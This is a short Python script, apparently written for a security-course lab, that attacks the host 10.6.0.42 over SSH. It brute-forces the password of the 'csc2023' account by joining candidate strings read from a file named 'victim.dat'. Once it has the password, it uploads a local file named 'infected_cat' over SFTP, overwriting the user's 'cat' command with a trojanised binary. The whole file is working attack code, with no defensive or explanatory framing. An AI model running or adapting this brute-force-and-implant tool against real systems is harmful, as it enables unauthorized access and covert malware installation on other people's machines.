#!/usr/bin/python3
import paramiko
from paramiko.ssh_exception import AuthenticationException, SSHException
from itertools import product
from zipfile import ZipFile, ZIP_DEFLATED
import os


def login(ip: str, username: str = "csc2023", password: str = ""):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    while True:
        try:
            ssh.connect(
                hostname=ip, username=username, password=password, banner_timeout=10
            )
        except AuthenticationException as e:
            print(f"{e}")
            ssh.close()
            return False
        except SSHException as e:
            print(type(e), e)
        else:
            break
    print(f"Cracked {password=}")
    return True


def get_list(path: str = "./victim.dat"):
    with open(path, "r") as f:
        content = f.readlines()
    return [r.strip() for r in content]


def crack(ip: str) -> str:
    cand = get_list()
    it = 0
    password = None
    while password is None:
        it += 1
        print(f"Iteration: {it}")
        for c in product(cand, repeat=it):
            pwd = "".join(c)
            print(f"Trying with {pwd=}", end="\t=> ")
            if login(ip, "csc2023", pwd):
                password = pwd
                break
    return password


def main():
    vip = "10.6.0.42"
    pwd = crack(vip)
    with open("infected_cat", "rb") as f:
        infected_cat = f.read()
    print(len(infected_cat))
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostname=vip, username="csc2023", password=pwd)
    # stdin,stdout,stderr=ssh.exec_command('ip -c a')
    # print(stdout.read().decode())
    sftp = ssh.open_sftp()
    sftp.put("./infected_cat", "/home/csc2023/cat")
    sftp.close()


if __name__ == "__main__":
    main()
